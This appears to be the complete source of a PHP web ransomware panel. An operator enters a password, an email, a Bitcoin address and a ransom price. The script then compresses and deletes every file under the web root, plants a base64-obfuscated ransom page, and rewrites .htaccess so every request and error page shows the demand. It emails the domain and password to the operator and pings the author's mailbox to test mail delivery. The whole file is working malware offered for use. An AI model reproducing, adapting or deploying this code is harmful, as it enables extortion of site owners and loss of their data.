<title>#Test!</title>
<link rel="shortcut icon" type="image/x-icon" href="https://i.ibb.co/h2zC35r/mickey-mouse.png">
<style>
html {
background: black;
color: white;
}
input { background: transparent; color: white; border: 1px solid white; }
</style>
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.bit') !== false) {
    return;
	}
	file_put_contents($filename.".bit", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
copy('.htaccess','.htabackup');
$file = base64_decode("PHRpdGxlPkV2YWwuUmFuc29td2FyZTwvdGl0bGU+DQo8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9pLmliYi5jby9KeUZYWGhHL2J0Yy5wbmciPg0KPHN0eWxlPg0KaHRtbCB7DQpiYWNrZ3JvdW5kOiBibGFjazsNCmNvbG9yOiB3aGl0ZTsNCn0NCmlucHV0IHsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGNvbG9yOiB3aGl0ZTsgYm9yZGVyOiAxcHggc29saWQgd2hpdGU7IH0NCjwvc3R5bGU+DQo8P3BocA0KZXJyb3JfcmVwb3J0aW5nKDApOw0KJGlucHV0ID0gJF9QT1NUWydwYXNzJ107DQokcGFzcyA9ICJwaGFzcyI7DQppZihpc3NldCgkaW5wdXQpKSB7DQppZihtZDUoJGlucHV0KSA9PSAkcGFzcykgew0KZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpew0KCWlmIChzdHJwb3MoJGZpbGVuYW1lLCAnLmJpdCcpID09PSBGQUxTRSkgew0KCXJldHVybjsNCgl9DQoJJGRlY3J5cHRlZCA9IGd6aW5mbGF0ZShmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKTsNCglmaWxlX3B1dF9jb250ZW50cyhzdHJfcmVwbGFjZSgnLmJpdCcsICcnLCAkZmlsZW5hbWUpLCAkZGVjcnlwdGVkKTsNCgl1bmxpbmsoJ2J0Yy5waHAnKTsNCgl1bmxpbmsoJy5odGFjY2VzcycpOw0KCXVubGluaygkZmlsZW5hbWUpOw0KCWVjaG8gIiRmaWxlbmFtZSBEZWNyeXB0ZWQgISEhPGJyPiI7DQp9DQoNCmZ1bmN0aW9uIGRlY2RpcigkZGlyKXsNCgkkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpciksIGFycmF5KCcuJywgJy4uJykpOw0KCQlmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSkgew0KCQkJaWYoaXNfZGlyKCRkaXIuIi8iLiRmaWxlKSl7DQoJCQkJZGVjZGlyKCRkaXIuIi8iLiRmaWxlKTsNCgkJCX1lbHNlIHsNCgkJCQlkZWNmaWxlKCRkaXIuIi8iLiRmaWxlKTsNCgkJfQ0KCX0NCn0NCg0KZGVjZGlyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10pOw0KZWNobyAiPGJyPldlYnJvb3QgRGVjcnlwdGVkPGJyPiI7DQp1bmxpbmsoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOw0KdW5saW5rKCcuaHRhY2Nlc3MnKTsNCmNvcHkoJ2h0YWJhY2t1cCcsJy5odGFjY2VzcycpOw0KZWNobyAnU3VjY2VzcyAhISEnOw0KfSBlbHNlIHsNCmVjaG8gJ0luY29ycmVjdCBwYXNzd29yZCE8YnI+VGhlcmUgYXJlIHJlc3RyaWN0aW9ucyBmb3IgZW50ZXJpbmcgY29ycmVjdCBwYXNzd29yZHMuIElmIHlvdSBjcm9zcyB0aGF0IGxpbWl0IGFsbCB0aGUgZmlsZXMgaGVyZSB3aWxsIGJlIGF1dG9tYXRpY2FsbHkgZGVsZXRlZCEnOw0KfQ0KZXhpdCgpOw0KfQ0KPz4NCjxjZW50ZXI+DQo8aW1nIHdpZHRoPSIyMCUiIHNyYz0iaHR0cHM6Ly9pLmliYi5jby9KeUZYWGhHL2J0Yy5wbmciLz4NCjxicj4NCjxoMz5Zb3VyIFdlYnNpdGUgSXMgRW5jcnlwdGVkPC9oMz4NCkRvbid0IENoYW5nZSB0aGUgRmlsZW5hbWUgYmVjYXVzZSBpdCBDYW4gRGFtYWdlIHRoZSBGaWxlIElmIFlvdSBXYW50IHRvIFJldHVybiBZb3UgTXVzdCBFbnRlciB0aGUgUGFzc3dvcmQgRmlyc3QNCjxicj4NClNlbmQgTWUgJDMgRm9yIEJhY2sgWW91ciBXZWJzaXRlIDxicj48YnI+DQpCaXRjb2luIEFkZHJlc3MgOiA8aW5wdXQgdHlwZT0idGV4dCIgdmFsdWU9ImJ0Y2FkZHJlc3MiIHJlYWRvbmx5Pg0KPGJyPjxicj4NCjxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0icG9zdCI+DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIj4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkRlY3J5cHQiPg0KPC9mb3JtPg0KPGJyPkNvbnRhY3QgTWFpbCA6IGV2YWwucmFuc29td2FyZUBwcm90b25tYWlsLmNvbQ==");
$q = str_replace('phass', md5($_POST['pass']), $file);
$w = str_replace('eval.ransomware@protonmail.com', $_POST['email'], $q);
$e = str_replace('btcaddress', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('btc.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex btc.php\n
ErrorDocument 403 /btc.php\n
ErrorDocument 404 /btc.php\n
ErrorDocument 500 /btc.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Encrypted !!!<br>";
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}

if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('btc.php', $_SERVER['DOCUMENT_ROOT'].'/btc.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$to = $_POST['email'];
$subject = 'Your Ransomware Info';
$message = "Domain : ".$_SERVER['SERVER_NAME']."\n\n"."Your Password : ".$_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>
<center>
<img height="200" src="https://i.ibb.co/h2zC35r/mickey-mouse.png"/>
<br><br><h3>Information Server :</h3>
Path File : <font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function : <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : <font color="red"><?php if(mail('eval.ransomware@protonmail.com','Test','Test')) { echo "ON"; } else { echo "OFF"; } ?></font>
<br><Br>
<form enctype="multipart/form-data" method="post">
Password Encrypt : <input type="text" name="pass"> Your Email : <input type="text" name="email">
<br><br>
Your Bitcoin Address : <input type="text" name="btc"> Your Price : <input type="text" name="price">
<br><br>
<input type="submit" value="Encrypt">
</form>